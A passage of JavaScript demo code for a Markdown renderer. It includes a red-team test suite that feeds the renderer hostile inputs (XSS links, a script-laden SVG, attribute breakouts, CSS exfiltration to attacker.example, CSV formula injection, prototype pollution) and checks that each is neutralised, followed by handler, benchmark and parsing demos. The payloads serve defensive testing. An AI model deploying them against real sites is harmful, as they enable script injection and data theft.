- [entity colon](javascript&#58;alert(1))
- [data page](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
- [vbscript](vbscript:msgbox(1))
- <javascript:alert(1)>
- [an honest link](https://commonmark.org)
`,
    checks: [
      ...STD,
      ['The honest link survives', (root) => root.querySelector('a[href^="https://commonmark.org"]') !== null],
    ],
  },
  {
    title: 'An SVG with ideas',
    threat: 'onload, an inline script, a javascript: link and a foreignObject iframe, all in one image.',
    src: `<<<BADGE type="image/svg+xml" title="A hostile SVG"
<svg xmlns="http://www.w3.org/2000/svg" width="120" height="60" onload="alert('onload')"><script>alert('script')</script><a href="javascript:alert('link')"><rect width="120" height="60" rx="10" fill="#b4441c"/></a><foreignObject width="120" height="60"><iframe xmlns="http://www.w3.org/1999/xhtml" src="https://attacker.example/"></iframe></foreignObject></svg>
BADGE
`,
    checks: [
      ...STD,
      ['Drawn through <img>, not inlined', (root) => root.querySelector('img') !== null && root.querySelector('svg script, svg foreignObject') === null],
    ],
  },
  {
    title: 'Attribute injection',
    threat: 'A title and filename that try to close the tag they are written into, and an event handler as an attribute.',
    src: `<<<NAME type="text/plain" title='"><img src=x onerror=alert(1)>' filename='"><script>alert(2)</script>.txt' onmouseover="alert(3)"
The attributes above try to break out of the markup they end up in.
NAME
`,
    checks: STD,
  },
  {
    title: 'Payload leaks',
    threat: 'Four broken resources, each carrying a canary. If a canary reaches the page, the payload leaked.',
    src: `<<<NOTYPE title="No type"
CANARY-NOTYPE-7f3a
NOTYPE

<<<NOPE type="application/x-unknown-format" title="Unknown type"
CANARY-UNKNOWN-91bc
NOPE

<<<BADB64 type="text/plain" encoding="base64" title="Broken base64"
!!! CANARY-B64-55de !!!
BADB64

<<<BADJSON type="application/json" title="Invalid JSON"
{"secret": "CANARY-JSON-c0ff",
BADJSON
`,
    checks: [
      ['Missing type: payload withheld', absent('CANARY-NOTYPE-7f3a')],
      ['Unknown type: payload withheld', absent('CANARY-UNKNOWN-91bc')],
      ['Broken base64: payload withheld', absent('CANARY-B64-55de')],
      ['Invalid JSON: payload withheld', absent('CANARY-JSON-c0ff')],
    ],
  },
  {
    title: 'Terminator tricks',
    threat: 'Near-miss terminators, an injected heading and a fake nested resource carrying a script.',
    src: `<<<BOX type="text/plain" title="A payload that impersonates its surroundings"
BOX only ends the block on a line of its own; BOXES and box are text.
BOXES
box
## Injected heading
<<<FAKE type="text/html"
<script>alert('nested')</script>
FAKE
BOX

This sentence comes after the resource.
`,
    checks: [
      ...STD,
      ['The injected heading stays text', (root) => [...root.querySelectorAll('h1,h2,h3,h4,h5,h6')].every((x) => !x.textContent.includes('Injected heading'))],
      ['The resource ends at the right line', (root) => [...root.querySelectorAll('p')].some((p) => p.textContent.includes('This sentence comes after'))],
    ],
  },
  {
    title: 'Locked stays locked',
    threat: 'An encrypted section, a remote image and a page to frame, rendered with async: true, the full pipeline.',
    async: true,
    src: async () => {
      const ct = await encryptAge(SEALED_SECRET, 'correct horse battery staple', { workFactor: WORK_FACTOR });
      return `<<<SEALED type="text/markdown" encoding="base64 age" title="Sealed orders"
${ct}
SEALED

<<<BEACON type="image/svg+xml" encoding="uri" title="A remote beacon"
https://attacker.example/beacon.svg
BEACON

<<<FRAME type="text/uri-list" title="A page that wants a frame"
https://attacker.example/
FRAME
`;
    },
    checks: [
      ...STD,
      ['The plaintext never appears', absent(SEALED_SECRET)],
      ['The sealed card still shows its title', (root) => root.textContent.includes('Sealed orders') || root.querySelector('[title="Sealed orders"]') !== null],
      ['Nothing remote is loaded or framed', nothingRemote],
    ],
  },
  {
    title: 'CSS exfiltration',
    threat: '@import, background images, attribute-selector leaks and a remote font, all aimed at attacker.example.',
    src: `<<<EXFIL type="text/css" rel="stylesheet"
@import url(https://attacker.example/steal.css);
md2-document { background: url(https://attacker.example/seen.png); }
input[value^="a"] { background-image: url("https://attacker.example/?a"); }
@font-face { font-family: x; src: url(https://attacker.example/font.woff); }
EXFIL

This document tries to phone home through its styles.
`,
    checks: [
      ...STD,
      [
        'No live style mentions attacker.example',
        (root) =>
          [...root.querySelectorAll('style')].every((s) => !s.textContent.includes('attacker.example')) &&
          [...root.querySelectorAll('[style]')].every((el) => !el.getAttribute('style').includes('attacker.example')),
      ],
    ],
  },
  {
    title: 'Hostile data',
    threat: 'Markup and spreadsheet formulas inside CSV cells, and a script-closing string inside JSON.',
    src: `<<<CELLS type="text/csv" title="A poisoned spreadsheet"
Name,Comment
<img src=x onerror=alert(1)>,"=HYPERLINK(""javascript:alert(2)"",""click"")"
<script>alert(3)</script>,ok
CELLS

<<<RECORD type="application/json" title="A poisoned record"
{"name": "</script><script>alert(4)</script>", "__proto__": {"polluted": true}}
RECORD
`,
    checks: [...STD, ['Object.prototype is not polluted', () => !({}).polluted]],
  },
];

async function demoRedTeam() {
  const grid = $('rt-grid');
  let passed = 0;
  let total = 0;
  for (const [i, a] of ATTACKS.entries()) {
    const card = h('article', { className: 'rt-card' });
    grid.append(card);
    try {
      const src = typeof a.src === 'function' ? await a.src() : a.src;
      const opts = { idPrefix: `rt${i}-` };
      const html = a.async ? await marked.parse(src, { ...opts, async: true }) : marked.parse(src, opts);
      const frag = parseToFragment(html);
      const results = a.checks.map(([label, test]) => {
        let ok = false;
        try {
          ok = Boolean(test(frag, html));
        } catch {
          ok = false;
        }
        return [label, ok];
      });
      const good = results.filter(([, ok]) => ok).length;
      passed += good;
      total += results.length;

      const out = h('div', { className: 'md2-surface out rt-out' });
      out.innerHTML = html;
      card.append(
        h(
          'h3',
          {},
          h('span', { textContent: a.title }),
          h('small', { className: good === results.length ? 'pass-count' : 'fail-count', textContent: `${good}/${results.length}` }),
        ),
        h('p', { className: 'note', textContent: a.threat }),
        h('ul', { className: 'checks' }, ...results.map(([label, ok]) => h('li', { className: ok ? 'pass' : 'fail', textContent: label }))),
        h('details', {}, h('summary', { textContent: 'Attack source' }), h('pre', {}, h('code', { textContent: src }))),
        out,
      );
    } catch (e) {
      total += 1;
      card.append(h('h3', { textContent: a.title }), h('p', { className: 'err', textContent: `Could not run: ${e instanceof Error ? e.message : e}` }));
    }
  }
  const summary = $('rt-summary');
  summary.textContent =
    passed === total
      ? `${passed} of ${total} checks passed across ${ATTACKS.length} attacks.`
      : `${passed} of ${total} checks passed. Failures are listed in red below.`;
  summary.className = `verdict ${passed === total ? 'ok' : 'bad'}`;
  $('proof-checks').textContent = `${passed}/${total}`;
}

// ================================================================ 5: custom handlers

const BARS = '▁▂▃▄▅▆▇█';

const HANDLERS = [
  {
    types: ['text/x-shout'],
    render: (bytes) => `<p class="shout">${esc(decode(bytes).toUpperCase())}</p>`,
  },
  {
    types: ['text/x-sparkline'],
    render: (bytes) => {
      const xs = decode(bytes).trim().split(/[\s,]+/).map(Number);
      if (xs.length === 0 || xs.some(Number.isNaN)) throw new Error('every value must be a number');
      const lo = Math.min(...xs);
      const hi = Math.max(...xs);
      const line = xs.map((x) => BARS[hi === lo ? 3 : Math.round(((x - lo) / (hi - lo)) * (BARS.length - 1))]).join('');
      return `<p class="spark"><span class="spark-line" role="img" aria-label="${esc(`${xs.length} values from ${lo} to ${hi}`)}">${line}</span><small>min ${esc(lo)} · max ${esc(hi)} · last ${esc(xs.at(-1))}</small></p>`;
    },
  },
  {
    types: ['text/x-palette'],
    render: (bytes) => {
      const swatches = decode(bytes)
        .split(/\r?\n/)
        .map((l) => l.trim())
        .filter(Boolean)
        .map((l) => {
          const m = /^(#[0-9a-f]{3}(?:[0-9a-f]{3})?)\b\s*(.*)$/i.exec(l);
          if (!m) throw new Error(`not a colour: ${l}`);
          return { hex: m[1].toLowerCase(), name: m[2] || m[1] };
        });
      const sw = 64;
      const gap = 14;
      const width = swatches.length * (sw + gap) - gap;
      const height = sw + 36;
      const cells = swatches
        .map((s, i) => {
          const x = i * (sw + gap);
          return `<rect x="${x}" y="0" width="${sw}" height="${sw}" rx="12" fill="${s.hex}" stroke="currentColor" stroke-opacity="0.15"/><text x="${x + sw / 2}" y="${sw + 15}" text-anchor="middle" font-size="11" font-family="system-ui, sans-serif" fill="currentColor">${esc(s.name)}</text><text x="${x + sw / 2}" y="${sw + 29}" text-anchor="middle" font-size="10" font-family="ui-monospace, monospace" fill="currentColor" opacity="0.65">${esc(s.hex)}</text>`;
        })
        .join('');
      return `<figure class="palette"><svg xmlns="http://www.w3.org/2000/svg" width="${width}" height="${height}" viewBox="0 0 ${width} ${height}" role="img" aria-label="${esc(swatches.map((s) => s.name).join(', '))}">${cells}</svg></figure>`;
    },
  },
  {
    types: ['text/x-ini'],
    render: (bytes) => {
      const rows = [];
      let section = '';
      for (const raw of decode(bytes).split(/\r?\n/)) {
        const line = raw.trim();
        if (!line || line.startsWith(';') || line.startsWith('#')) continue;
        const s = /^\[(.+)\]$/.exec(line);
        if (s) {
          section = s[1];
          continue;
        }
        const eq = line.indexOf('=');
        if (eq < 0) throw new Error(`not key = value: ${line}`);
        rows.push([section, line.slice(0, eq).trim(), line.slice(eq + 1).trim()]);
      }
      return `<table class="ini"><thead><tr><th>Section</th><th>Key</th><th>Value</th></tr></thead><tbody>${rows
        .map((r) => `<tr>${r.map((c) => `<td>${esc(c)}</td>`).join('')}</tr>`)
        .join('')}</tbody></table>`;
    },
  },
];

const EXTEND_SRC = `# Handlers you write

Rendered on {{today}} by a separate \`Marked\` instance with four extra handlers.

<<<BRAND type="text/x-palette" title="text/x-palette: this page's colours"
#0f6b5f Teal
#b0802a Gold
#b4441c Rust
#25222c Ink
#ebe4d6 Paper
BRAND

<<<VISITS type="text/x-sparkline" title="text/x-sparkline: visits this fortnight"
12 15 9 22 30 28 41 39 35 52 61 58 70 66
VISITS

<<<SERVER type="text/x-ini" title="text/x-ini: a config file as a table"
; comments are skipped
[server]
host = 0.0.0.0
port = 8080
[cache]
ttl = 300
strategy = stale-while-revalidate
SERVER

<<<LOUD type="text/x-shout" title="text/x-shout"
markdown2 handlers turn bytes into views
LOUD

<<<BROKEN type="text/x-sparkline" title="A handler that throws fails closed"
12 15 banana 22
BROKEN

<<<QUIET type="text/plain" title="text/plain, a built-in handler"
the built-ins are still there
QUIET
`;

function demoExtend() {
  const counts = {};
  const md2 = new Marked({
    handlers: HANDLERS,
    hooks: {
      preprocess: (md) => md.replaceAll('{{today}}', new Date().toDateString()),
      postprocess: (html) => `<!-- rendered by a Marked instance -->\n${html}`,
    },
    walkTokens: (token) => {
      counts[token.type] = (counts[token.type] ?? 0) + 1;
    },
    idPrefix: 'ext-',
  });
  $('out-extend').innerHTML = md2.parse(EXTEND_SRC);
  $('walk-counts').textContent = `walkTokens saw: ${Object.entries(counts)
    .map(([k, v]) => `${v} × ${k}`)
    .join(', ')}.`;

  const tokens = md2.lexer(EXTEND_SRC).map((t) =>
    t.type === 'markdown'
      ? { type: t.type, line: t.line, text: t.text.length > 48 ? `${t.text.slice(0, 48)}…` : t.text }
      : { type: t.type, token: t.token, mediaType: t.mediaType, rel: t.rel, line: t.line, ...(t.error ? { error: t.error } : {}) },
  );
  $('tokens').textContent = JSON.stringify(tokens, null, 2);
}

// ================================================================ 6: speed

function stressSource(n) {
  const parts = ['# Stress test', ''];
  for (let i = 0; i < n; i++) {
    parts.push(
      `## Section ${i + 1}`,
      '',
      `Paragraph ${i} with **bold**, *emphasis*, \`code\` and [a link](https://commonmark.org/#${i}).`,
      '',
      resource({ type: 'application/json', token: `J${i}`, title: `Record ${i}`, payload: JSON.stringify({ i, ok: i % 7 !== 0, tags: ['alpha', 'beta'], score: (i * 37) % 101 }) }),
      '',
      resource({ type: 'text/plain', encoding: 'base64', token: `B${i}`, payload: btoa(`row ${i}: hello from base64`) }),
      '',
      resource({ type: 'text/csv', token: `C${i}`, title: `Table ${i}`, payload: `k,v\na,${i}\nb,${i * 2}` }),
      '',
    );
  }
  return parts.join('\n');
}

function bench(n, runs = 3) {
  const src = stressSource(n);
  marked.parse(src, { idPrefix: 'warm-' });
  const times = [];
  let html = '';
  for (let r = 0; r < runs; r++) {
    const t0 = performance.now();
    html = marked.parse(src, { idPrefix: `b${r}-` });
    times.push(performance.now() - t0);
  }
  times.sort((a, b) => a - b);
  return {
    n,
    resources: n * 3,
    srcBytes: utf8.encode(src).length,
    htmlBytes: utf8.encode(html).length,
    median: times[Math.floor(times.length / 2)],
  };
}

function demoSpeed() {
  const body = $('speed-table').tBodies[0];
  const results = [];
  const draw = () => {
    const best = Math.max(...results.map((r) => r.resources / r.median));
    body.replaceChildren(
      ...results.map((r) => {
        const rate = r.resources / r.median;
        const bar = h('span', { className: 'bar' });
        bar.style.setProperty('width', `${Math.max(4, (rate / best) * 100)}%`);
        return h(
          'tr',
          {},
          h('td', { className: 'num', textContent: r.n.toLocaleString() }),
          h('td', { className: 'num', textContent: r.resources.toLocaleString() }),
          h('td', { className: 'num', textContent: fmtBytes(r.srcBytes) }),
          h('td', { className: 'num', textContent: fmtBytes(r.htmlBytes) }),
          h('td', { className: 'num', textContent: ms(r.median) }),
          h('td', { className: 'num', textContent: `${Math.round(rate * 1000).toLocaleString()} resources/s · ${((r.srcBytes / r.median) * 1000 / (1024 * 1024)).toFixed(1)} MB/s` }),
          h('td', {}, bar),
        );
      }),
    );
  };
  for (const b of $('speed-buttons').querySelectorAll('button')) {
    b.addEventListener('click', async () => {
      const buttons = [...$('speed-buttons').querySelectorAll('button')];
      for (const x of buttons) x.disabled = true;
      const old = b.textContent;
      b.textContent = 'Running…';
      await new Promise((r) => setTimeout(r, 30)); // let the button repaint first
      try {
        results.unshift(bench(Number(b.dataset.n)));
        draw();
      } catch (e) {
        showError(e);
      } finally {
        b.textContent = old;
        for (const x of buttons) x.disabled = false;
      }
    });
  }
}

function heroSpeed() {
  try {
    const r = bench(200, 3);
    $('proof-speed').textContent = ms(r.median);
  } catch (e) {
    $('proof-speed').textContent = 'n/a';
    console.error(e);
  }
}

// ================================================================ 8 and 9: marked.parse

const NESTED = `## Unzipped

This nested document travelled **gzip-compressed** and base64-encoded:

\`encoding="base64 gzip"\`
`;

function demoSource(gz) {
  return `---
title: The drop-in demo
---
# Rendered by marked.parse()

Ordinary **Markdown** first: *emphasis*, ~~strikethrough~~, \`code\` and [a link](https://commonmark.org).

| Feature | Synchronous | Notes |
| :------ | :---------: | ----: |
| Prose and tables | yes | GFM tables |
| \`base64\` | yes | decoded in place |
| \`gzip\` | no | use \`async: true\` |

<<<DATA type="application/json" title="JSON, pretty-printed"
{"format":"Markdown2","draft":0.2,"resources":["typed","opaque","nested"]}
DATA

<<<PLANETS type="text/csv" title="CSV as a table"
Planet,Moons,Type
Mercury,0,Terrestrial
Earth,1,Terrestrial
Jupiter,95,Gas giant
PLANETS

<<<LOGO type="image/svg+xml" title="SVG, drawn as an image (its script never runs)"
<svg xmlns="http://www.w3.org/2000/svg" width="96" height="96"><circle cx="48" cy="48" r="40" fill="#0f6b5f"/><circle cx="48" cy="48" r="16" fill="#b0802a"/><script>alert('this never runs')</script></svg>
LOGO

<<<HELLO type="text/plain" encoding="base64" title="Decoded from base64"
SGVsbG8sIHdvcmxkIQ==
HELLO

\`\`\`wavedrom
{ signal: [
  { name: "clk", wave: "p......" },
  { name: "req", wave: "0.1..0." },
  { name: "ack", wave: "0..1..0" }
] }
\`\`\`

<<<ZIPPED type="text/markdown" encoding="base64 gzip" title="Compressed nested document"
${gz}
ZIPPED

<<<REMOTE type="image/svg+xml" encoding="uri" title="A remote icon, locked until allowed"
https://md2.cognotik.com/icon.svg
REMOTE

<<<OOPS title="A resource without a type"
# Not a heading. This payload never leaks into the page.
OOPS

<<<CAD type="model/x-acme-cad" title="Unknown type, still shown" filename="bracket.cad"
opaque bytes
CAD
`;
}

async function demoParse() {
  const gz = await gzipBase64(NESTED);
  const src = demoSource(gz);
  $('src-sync').textContent = src;

  const syncDiags = [];
  $('out-sync').innerHTML = marked.parse(src, {
    idPrefix: 'sync-',
    onDiagnostics: (d) => syncDiags.push(...d),
  });
  showDiagnostics($('diag-sync'), syncDiags);
  const waiting = $('out-sync').querySelectorAll(`md2-resource[error="${REQUIRES_ASYNC}"]`).length;
  $('sync-note').textContent = `${waiting} resource${waiting === 1 ? '' : 's'} here need${waiting === 1 ? 's' : ''} async: true (error "${REQUIRES_ASYNC}").`;

  const asyncDiags = [];
  $('out-async').innerHTML = await marked.parse(src, {
    async: true,
    idPrefix: 'async-',
    onDiagnostics: (d) => asyncDiags.push(...d),
  });
  showDiagnostics($('diag-async'), asyncDiags);
}

// ================================================================ 11: custom element themes

function setupThemes() {
  const el = $('demo-element');
  const buttons = [...document.querySelectorAll('.theme-btn')];
  for (const b of buttons) {
    b.addEventListener('click', () => {
      el.setAttribute('theme', b.dataset.theme);
      for (const x of buttons) x.setAttribute('aria-pressed', String(x === b));
    });
  }
}

// ================================================================ start

setupTabs();
defineElement();
setupThemes();
run(demoExtend);
run(demoNest);
run(demoSpeed);
run(demoParse);
run(demoPlayground);
run(demoLab);
run(demoRedTeam);
setTimeout(heroSpeed, 400);